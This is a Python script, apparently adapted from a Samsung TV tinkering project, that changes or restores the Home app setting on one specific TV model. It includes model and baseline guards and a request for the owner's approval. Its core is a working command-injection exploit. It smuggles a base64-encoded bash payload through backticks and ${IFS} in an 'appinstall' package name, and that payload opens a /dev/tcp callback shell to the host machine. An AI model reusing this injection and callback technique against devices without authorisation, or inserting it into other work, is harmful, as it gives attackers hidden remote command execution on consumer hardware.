"""Bounded native Home apply/restore for the single inspected S95B.

Adapted from chaosmanage/samsung-tv-launcher scripts/native-home/run.py
(MIT, Nathan Clark). This uses an undocumented SDB command transport.
Do not run apply without the TV owner's explicit approval for Home writes.
"""

import base64
import json
import os
from pathlib import Path
import socket
import subprocess
import sys
import urllib.request
import uuid


ROOT = Path(__file__).resolve().parent
PRIVATE = ROOT / "private"
TV_IP = os.environ.get("TV_IP", "")
TV_MODEL = "QE55S95BATXXH"
SERIAL = TV_IP + ":26101"
SDB = Path(os.environ.get("SDB_PATH", r"C:\tizen-studio\tools\sdb.exe"))
REMOTE = "/home/owner/share/tmp/sdk_tools"


def run_sdb(args, timeout=30):
    result = subprocess.run([str(SDB), *args], capture_output=True, text=True, timeout=timeout)
    if result.returncode:
        raise RuntimeError("SDB failed: " + result.stderr[-500:] + result.stdout[-500:])


def require_model():
    with urllib.request.urlopen(f"http://{TV_IP}:8001/api/v2/", timeout=5) as response:
        info = json.load(response)
    actual = info.get("device", {}).get("modelName")
    if actual != TV_MODEL:
        raise RuntimeError(f"Model guard stopped: {actual!r} != {TV_MODEL!r}")


def main():
    if len(sys.argv) != 2 or sys.argv[1] not in ("apply", "restore"):
        raise SystemExit("Use: python control.py apply|restore")
    mode = sys.argv[1]
    if not TV_IP:
        raise RuntimeError("Set TV_IP to your TV's local IP address")
    if not SDB.is_file():
        raise RuntimeError(f"SDB missing: {SDB}")
    baseline = PRIVATE / "original.json"
    original = json.loads(baseline.read_text(encoding="utf-8"))
    required = ("db/appfw/home_appid", "db/appfw/startup_appid", "db/appfw/booting_appid_backup", "db/first_screen/type")
    values = original.get("Strings", {})
    if (original.get("Home") != "com.samsung.tv.csfs" or
            values.get("db/appfw/home_appid") != "com.samsung.tv.csfs" or
            any(not values.get(key) for key in required) or
            original.get("Autostart") not in (0, 1)):
        raise RuntimeError("Invalid original baseline; refusing TV write")
    require_model()
    run_sdb(["connect", SERIAL])

    source_dir = ROOT / "out" / "control"
    for suffix in ("dll", "runtimeconfig.json", "deps.json"):
        source = source_dir / f"LumaHomeControl.{suffix}"
        if not source.is_file():
            raise RuntimeError(f"Missing compiled helper: {source}")
        run_sdb(["-s", SERIAL, "push", str(source), REMOTE + "/" + source.name])
    run_sdb(["-s", SERIAL, "push", str(baseline), REMOTE + "/LumaHomeOriginal.json"])

    token = uuid.uuid4().hex[:12]
    remote_shell = f"{REMOTE}/luma-{mode}-{token}.sh"
    shell_bytes = (ROOT / f"{mode}.sh").read_bytes().replace(b"\r\n", b"\n").replace(b"\r", b"\n")
    staged = PRIVATE / f"{mode}-{token}.sh"
    staged.write_bytes(shell_bytes)
    run_sdb(["-s", SERIAL, "push", str(staged), remote_shell])

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((TV_IP, 9))
        host_ip = route.getsockname()[0]
    with socket.socket() as listener:
        listener.bind((host_ip, 0))
        listener.listen(1)
        listener.settimeout(18)
        port = listener.getsockname()[1]
        callback = f"exec 3<>/dev/tcp/{host_ip}/{port};cat {remote_shell}|bash >&3 2>&3;exec 3>&-"
        script = f"/bin/mkdir /tmp/luma-{token} 2>/dev/null&&{{ {callback};}}"
        encoded = base64.b64encode(script.encode()).decode()
        package = "new2.tpk`printf${IFS}%s${IFS}" + encoded + "|base64${IFS}-d|bash`.tpk"
        argument = "0 appinstall tpk " + package
        if len(argument.encode()) > 400:
            raise RuntimeError("Reviewed transport size exceeded")
        process = subprocess.Popen(
            [str(SDB), "-s", SERIAL, "shell", argument],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            conn, peer = listener.accept()
            if peer[0] != TV_IP:
                raise RuntimeError("Unexpected callback peer")
            data = bytearray()
            with conn:
                conn.settimeout(8)
                while True:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    data.extend(chunk)
                    if len(data) > 100_000:
                        raise RuntimeError("Diagnostic output too large")
            output = data.decode(errors="replace")
            (PRIVATE / f"{mode}-output.txt").write_text(output, encoding="utf-8")
            expected = "LUMA_APPLIED=" if mode == "apply" else "LUMA_RESTORED="
            if f"LUMA_{mode.upper()}_BEGIN" not in output or expected not in output or f"LUMA_{mode.upper()}_END" not in output:
                raise RuntimeError(f"{mode} outcome is uncertain; inspect private output before retrying")
            print(output)
        finally:
            if process.poll() is None:
                process.terminate()
            process.communicate(timeout=8)


if __name__ == "__main__":
    main()
